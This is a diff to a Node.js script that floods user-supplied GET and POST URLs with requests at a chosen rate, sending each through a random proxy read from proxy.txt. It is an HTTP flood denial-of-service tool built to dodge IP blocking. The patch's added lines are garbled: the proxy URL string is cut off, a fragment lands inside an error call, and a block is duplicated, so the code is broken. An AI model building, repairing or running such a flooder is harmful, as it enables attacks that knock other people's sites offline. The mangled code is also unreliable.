@@ -9,7 +9,10 @@ const rl = readline.createInterface({
   output: process.stdout
 });
 
-const proxies = fs.readFileSync('proxy.txt', 'utf8').split('\n').filter(Boolean);
+const proxies = fs.readFileSync('proxy.txt', 'utf8')
+  .split('\n')
+  .filter(Boolean)
+  .filter(p => p.match(/^\d+\.\d+\.\d+\.\d+:\d+$/)); // format IP:PORT
 
 rl.question('Enter GET URL: ', (urlGet) => {
   rl.question('Enter POST URL: ', (urlPost) => {
@@ -20,24 +23,25 @@ rl.question('Enter GET URL: ', (urlGet) => {
 
         const interval = setInterval(() => {
           if (Date.now() >= endTime) clearInterval(interval);
+
           const randomReq = Math.random() < 0.5;
-          const proxies = fs.readFileSync('proxy.txt', 'utf8')
-            .split('\n')
-            .filter(Boolean)
-             .filter(p => p.match(/^\d+\.\d+\.\d+\.\d+:\d+$/)); // format IP:PORT
-      
-      
-             const agent = new HttpsProxyAgent('http://' + proxy);
-            
-            const config = { httpsAgent: agent };
+          const selectedProxy = proxies[Math.floor(Math.random() * proxies.length)];
+          const agent = new HttpsProxyAgent('http:                     
+          const config = { httpsAgent: agent };
 
           if (randomReq) {
             axios.get(urlGet, config)
-              .then(() => console.log(`GET sent via ${proxy}`))
+              .then(() => console.log(`GET sent via ${selectedProxy}`))
+              .catch(e => console.error('//' + selectedProxy);
+          const config = { httpsAgent: agent };
+
+          if (randomReq) {
+            axios.get(urlGet, config)
+              .then(() => console.log(`GET sent via ${selectedProxy}`))
               .catch(e => console.error('Error:', e.message));
           } else {
             axios.post(urlPost, dataPost, config)
-              .then(() => console.log(`POST sent via ${proxy}`))
+              .then(() => console.log(`POST sent via ${selectedProxy}`))
               .catch(e => console.error('Error:', e.message));
           }
         }, 1000 / parseInt(reqPerSec));
@@ -45,4 +49,3 @@ rl.question('Enter GET URL: ', (urlGet) => {
     });
   });
 });
-
